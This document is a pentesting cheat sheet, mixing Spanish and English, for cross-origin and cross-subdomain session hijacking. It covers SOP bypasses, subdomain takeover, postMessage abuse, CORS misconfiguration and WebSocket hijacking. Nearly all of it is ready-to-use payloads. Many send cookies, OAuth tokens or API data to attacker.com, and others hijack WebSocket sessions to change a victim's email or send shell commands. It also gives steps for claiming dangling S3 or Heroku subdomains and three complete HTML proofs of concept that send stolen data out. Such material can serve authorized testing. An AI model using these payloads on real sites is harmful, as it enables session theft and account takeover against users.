---
aliases:
  - SOP Bypass
  - CSWSH WebSocket Hijacking
  - postMessage Abuse
  - CORS Credential Leak
tags:
  - vuln/session-hijacking
  - technique/credential-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Session Hijacking]]"
  - "[[Cross-Site Request Forgery (CSRF)]]"
  - "[[Subdomain Takeover]]"
---
# Session Hijacking - Cross-Origin y Cross-Subdomain

***

## Same-Origin Policy (SOP) Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>document.domain='target.com'</script>` (en sub + parent ambos) | Legacy document.domain set common | Pre-2022 browsers. |
| `<iframe srcdoc="<script>parent.fetch('//attacker.com/?d='+parent.document.cookie)</script>"></iframe>` | srcdoc inline content shares parent origin | Edge HTML5. |
| `<iframe sandbox="allow-scripts" src="https://target.com"></iframe>` (sandbox → Origin null) | Sandboxed iframe Origin null exploit | Server accepts null. |
| `<a href="https://target.com/page" target="_blank">click</a>` luego `<script>window.opener.location='//attacker.com'</script>` | window.opener reference (tabnabbing) | Edge tabnabbing. |
| `new WebSocket('wss://target.com/api', ['Origin: //attacker.com'])` | WS lacks SOP — Origin not enforced | CSWSH. |
| `<iframe src="https://target.com" id=t></iframe><script>window.addEventListener('message',e=>fetch('//attacker.com/?d='+btoa(JSON.stringify(e.data))))</script>` | postMessage cross-origin listen | postMessage abuse. |
| `curl -H "Origin: https://attacker.com" -I https://target.com/api/me \| grep -i access-control` | Probe CORS reflected Origin | CORS misconfig. |
| `<embed src="https://target.com/file.swf">` (legacy Flash) | Plugin cross-origin bypass | Legacy Flash. |
| `<iframe src="data:text/html,<script>fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker.com/?d='+btoa(d)))</script>"></iframe>` | data: URL Origin null | Edge. |
| `<iframe src="file:///etc/passwd"></iframe>` (file:// Origin null) | Local file null origin | Local context. |
| `<script>document.cookie='session=ATTACKER; Domain=.target.com'</script>` (sub XSS) | Wildcard cookie cross-sub abuse | Cross-sub XSS. |
| Burp `Match and Replace` rule add `Origin: https://attacker.com` | Manual Origin manipulation | Manual probe. |
^sh-cross-sop

___

## Subdomain Takeover Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `subfinder -d target.com -all -recursive \| httpx -title -tech-detect` | Enum subdomains pre-takeover | Pre-attack. |
| `subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v` | subjack auto detect dangling CNAME | Takeover detect. |
| `nuclei -t http/takeovers/ -l subs.txt` | Nuclei takeover templates | Templates. |
| `dig CNAME forgotten.target.com` luego `aws s3 mb s3://forgotten.target.com` (claim S3 bucket) | Claim dangling S3 takeover | S3 takeover. |
| `heroku create forgotten-target && heroku domains:add forgotten.target.com` | Claim Heroku takeover | Heroku takeover. |
| `<script>document.cookie='session=ATTACKER; Domain=.target.com; Path=/'</script>` (host en sub claimed) | Set parent-scope cookie post-takeover | Cookie tossing. |
| `<script>fetch('//attacker.com/?c='+document.cookie)</script>` (host en claimed sub) | Read non-HttpOnly parent cookies | Cookie theft. |
| `curl https://target.com/oauth/authorize?redirect_uri=https://forgotten.target.com/callback&client_id=...` | OAuth redirect_uri whitelist subdomain abuse | OAuth code theft. |
| `curl -X POST -d "SAMLResponse=$(cat malicious_assertion.b64)" https://target.com/saml/acs` (host SP en sub) | SAML SP trust via sub takeover | Federation. |
| `<script>fetch('https://api.target.com/me', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker.com/?d='+btoa(d)))</script>` (host en sub allowed by CORS) | CORS wildcard sub credential abuse | CORS combo. |
| `<script src="https://forgotten.target.com/x.js"></script>` (CSP whitelist sub → JS XSS) | CSP wildcard sub bypass | CSP combo. |
| `new WebSocket('wss://target.com/api')` (host en claimed sub) | WS Origin trust via sub | CSWSH combo. |
| `certbot certonly --standalone -d forgotten.target.com` | Generate valid TLS cert for claimed sub | Cert legitimization. |
^sh-cross-subdomain-takeover

___

## postMessage Handler Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe src="https://target.com" id=t></iframe><script>window.addEventListener('message',e=>fetch('//attacker.com/?d='+btoa(JSON.stringify(e.data))))</script>` | Listen to postMessage from target iframe | App sends sensitive data via postMessage. |
| `<iframe src="https://target.com" id=t></iframe><script>setTimeout(()=>t.contentWindow.postMessage({type:'getToken'},'*'),3000)</script>` | Send forged message to target — request token | Listener sin origin check. |
| `<iframe src="https://target.com/oauth/callback"></iframe><script>addEventListener('message',e=>fetch('//attacker.com/?t='+e.data.access_token))</script>` | OAuth implicit token via postMessage | OAuth combo. |
| `<script>opener.postMessage({type:'exec',code:"fetch('//attacker.com/?c='+document.cookie)"},'*')</script>` (en popup atacante's) | Postmessage with code — XSS if listener eval | XSS-like sink. |
| `<iframe src="https://target.com" id=t></iframe><script>let m=new MessageChannel();t.contentWindow.postMessage('init',[m.port2]);m.port1.onmessage=e=>fetch('//attacker.com/?d='+btoa(e.data))</script>` | MessageChannel port abuse | Cross-origin port. |
| `<iframe src="https://target.com" id=t></iframe><script>t.contentWindow.postMessage('<img src=x onerror=fetch(`//attacker.com/?c=`+document.cookie)>','*')</script>` | Send HTML payload — listener may innerHTML it | XSS via postMessage sink. |
| Burp DOM Invader → Inject Test Payloads → check postMessage listeners | Auto-discover vulnerable listeners | Automated probe. |
| `<script>const b=new BroadcastChannel('app');b.onmessage=e=>fetch('//attacker.com/?d='+btoa(JSON.stringify(e.data)))</script>` (same-origin only) | BroadcastChannel exfil if same-origin XSS | Same-origin XSS combo. |
| `<iframe sandbox="allow-scripts" src="https://target.com"></iframe>` (Origin null) | Sandboxed iframe → Origin null bypasses origin check | Server accepts null. |
| `chrome --user-data-dir=/tmp/p --disable-web-security` luego DevTools → Console → `postMessage` listeners audit | Manual audit listeners | Pre-attack research. |
| `<script>onmessage=e=>{if(e.origin.endsWith('target.com'))fetch('//attacker.com/?d='+e.data)}</script>` (endsWith flaw) | Origin validation flaw `endsWith` allows `notrustedtarget.com` | Bypass validation. |
^sh-cross-postmessage

### postMessage exfil PoC

```html
<iframe src="https://target.com/login" id="t"></iframe>
<script>
  document.getElementById('t').onload = () => {
    window.addEventListener('message', (event) => {
      fetch('https://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify({
          origin: event.origin,
          data: event.data
        })
      });
    });
  };
</script>
```

___

## CORS Misconfig Credential Leak

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -I -H "Origin: https://attacker.com" https://target.com/api/me \| grep -iE "access-control"` | Probe reflected Origin + Allow-Credentials | Standard CORS probe. |
| `curl -I -H "Origin: null" https://target.com/api/me \| grep -i access-control-allow-origin` | Null Origin acceptance probe | Sandbox iframe abuse. |
| `curl -I -H "Origin: https://target.com.attacker.com" https://target.com/api/me \| grep access-control` | Suffix attack — substring match flaw | Origin validation flaw. |
| `curl -I -H "Origin: https://attacker-target.com" https://target.com/api/me \| grep access-control` | Prefix attack | Validation flaw. |
| `curl -I -H "Origin: https://sub.target.com" https://target.com/api/me \| grep access-control` | Wildcard subdomain trust check | Sub takeover combo. |
| `curl -I -H "Origin: http://target.com" https://target.com/api/me \| grep access-control` | HTTP vs HTTPS scheme confusion | Mixed scheme. |
| `curl -I -H "Origin: https://target.com:1234" https://target.com/api/me \| grep access-control` | Port confusion | Port parsing. |
| `<script>fetch('https://target.com/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('//attacker.com/?d='+btoa(JSON.stringify(d))))</script>` (host en attacker.com) | Direct CORS credential exfil PoC | Misconfig exploit. |
| `<script>fetch('https://target.com/api/admin',{credentials:'include',method:'POST',body:JSON.stringify({role:'admin'})}).then(r=>r.text())</script>` | CORS + state-changing action | CSRF+CORS combo. |
| `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target.com/me',{credentials:'include'}).then(r=>r.text()).then(d=>top.postMessage(d,'*'))</script>"></iframe>` | Sandbox + null Origin + parent postMessage exfil | Null exploit. |
| `python3 -c "import requests; print(requests.options('https://target.com/api/me', headers={'Origin':'https://attacker.com','Access-Control-Request-Method':'PUT','Access-Control-Request-Headers':'x-custom'}).headers)"` | Preflight OPTIONS probe | Preflight inspection. |
| `<script><!--JSONP-style--><script src="https://target.com/api/data?callback=alert"></script>` | JSONP-style abuse if API returns wrapped JS | JSONP CORS bypass. |
^sh-cross-cors

### CORS exfil PoC

```html
<script>
  fetch('https://target.com/api/user/profile', {
    method: 'GET',
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

___

## WebSocket Hijacking (CSWSH)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `wscat -c wss://target.com/socket -H "Origin: https://attacker.com"` | Manual WS connection con forged Origin | Pre-attack probe. |
| `<script>const ws=new WebSocket('wss://target.com/socket');ws.onmessage=e=>fetch('//attacker.com/?d='+btoa(e.data))</script>` (host en attacker.com) | CSWSH connect + exfil messages | App sin Origin check. |
| `<script>const ws=new WebSocket('wss://target.com/socket');ws.onopen=()=>ws.send(JSON.stringify({type:'change_email',email:'attacker@evil.com'}))</script>` | CSWSH state-changing action | Action injection. |
| `<iframe sandbox="allow-scripts" srcdoc="<script>new WebSocket('wss://target.com/socket').onopen=function(){this.send('{}');this.onmessage=e=>top.postMessage(e.data,'*')}</script>"></iframe>` | Null Origin via sandbox CSWSH | Origin null bypass. |
| `python3 -c "import websocket; ws=websocket.create_connection('wss://target.com/socket', cookie='session=STOLEN', origin='https://attacker.com'); ws.send('{}'); print(ws.recv())"` | Python WS replay con stolen cookie + forged Origin | Post-cookie steal. |
| `wscat -c "wss://target.com/socket?token=$TOKEN"` | WS token in URL fragment/query | Token-in-URL leak. |
| `wscat -c wss://target.com/socket -s 'jwt' -s "$JWT"` | Subprotocol-based auth | `Sec-WebSocket-Protocol` auth. |
| `<script>const ws=new WebSocket('wss://target.com/notifications');ws.onmessage=e=>{if(e.data.includes('token'))fetch('//attacker.com/?t='+btoa(e.data))}</script>` | Push notification token interception | Real-time sensitive. |
| Burp Suite → WebSocket history → repeat con manipulated Origin header | Manual CSWSH replay | Workflow probe. |
| `<script>const ws=new WebSocket('wss://target.com/admin');ws.onopen=()=>ws.send(JSON.stringify({cmd:'shell',args:'cat /etc/passwd'}))</script>` | Admin WS abuse | Privileged endpoint. |
^sh-cross-websocket

### CSWSH PoC complete

```html
<script>
  const ws = new WebSocket('wss://target.com/api/socket');

  ws.onopen = () => {
    ws.send(JSON.stringify({type:'change_email', email:'attacker@evil.com'}));
  };

  ws.onmessage = (event) => {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: event.data
    });
  };
</script>
```

***
